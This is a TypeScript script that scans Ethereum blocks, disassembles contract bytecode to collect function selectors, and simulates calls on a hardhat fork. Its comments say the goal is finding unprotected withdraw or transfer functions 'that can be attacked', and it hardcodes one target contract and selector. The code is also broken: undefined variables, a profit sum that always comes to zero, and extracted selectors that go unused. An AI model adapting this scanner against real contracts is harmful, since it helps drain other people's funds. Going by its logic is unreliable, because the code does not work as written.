import { ethers } from "ethers";
import { EVM } from "evm";
import { network } from 'hardhat'
import * as path from 'path';
import * as dotenv from "dotenv";
import * as _ from 'lodash';

dotenv.config({ path: path.resolve(__dirname, '.env') })

const resetFork = async (blockNumber: number) =>
  network.provider.request({
    method: 'hardhat_reset',
    params: [
      {
        forking: {
          jsonRpcUrl: process.env.ETH_HTTPS_PROVIDER,
          blockNumber,
        },
      },
    ],
})

async function simulate(latestBlockNumber: number, txData: ethers.utils.Deferrable<ethers.providers.TransactionRequest>) {
	console.log('Simulating ...')
	await resetFork(latestBlockNumber)
	console.log('Request ...')

    const preBalance = await signer.getBalance()

	console.log('preBalance ...', ethers.utils.formatEther(preBalance))

	let tx = await signer.sendTransaction(txData)
	console.log('tx ...', tx)
	await tx.wait()
	console.log('receipt ...', receipt)
    const postBalance = await signer.getBalance()
	console.log(`postBalance`,  ethers.utils.formatEther(postBalance))
	const profit = ethers.utils.formatEther(postBalance.sub(postBalance))

	console.log(`preBalance`, preBalance)
	console.log(`postBalance`, postBalance)
	console.log(`profit`, profit)
	// return profit
}

const run = async () => { 
	// Step 1: 
	// Loop through all tx.to of every transaction on every block and get the bytcode 
	// Step 2:
	// Convert the bytecode to optcode and simulate all PUSH4 sighash 
	// Step 3:
	// If balance increased on simulation this means that the transfer isn't secured and can be attacked. This will only work on transfer function without parameter and without onlyOwner
	const provider = new ethers.providers.WebSocketProvider(process.env.ETH_WS_PROVIDER as string)
	const signer = new ethers.Wallet(process.env.PRIVATE_KEY as string, provider);
	
	const latestBlockNumber = await provider.getBlockNumber()
	for (let i = 0; i < latestBlockNumber; i++) {
		let block = await provider.getBlockWithTransactions(i)

		if (block.transactions.length == 0) 
			return

		_.forEach(block.transactions, async (tx) => {
			let byteCode = await provider.getCode(tx.to); // Convert the address to bytcode
			const evm = new EVM(byteCode);
			const opcode = evm.getOpcodes(); // Convert the bytecode to opcode
		
			let allPUSH4 = _.filter(opcode, { 'name': 'PUSH4' }) // Get all PUSH4 

			_.forEach(allPUSH4, async (push4) => {
				const data = '0x' + (push4.pushData).toString('hex') // Convert pushData from Buffer to readable hex string
				// 3ccfd60b is a withdraw function sighash

				// TODO: simulate the transaction
				const getBlockNumber = await provider.getBlockNumber()

				const txData = {
					to: "0x118BC2E4b1e3d7e79878A7076e02958087D79945",
					data: "0x90386bbf", // if the function doesn't have `onlyOwner`
					gasPrice: ethers.utils.parseUnits("2", "gwei"),
					gasLimit: 330000,
				}

				simulate(getBlockNumber - 5, txData)

			})

		})

	}

	

}

run()
                                                                                              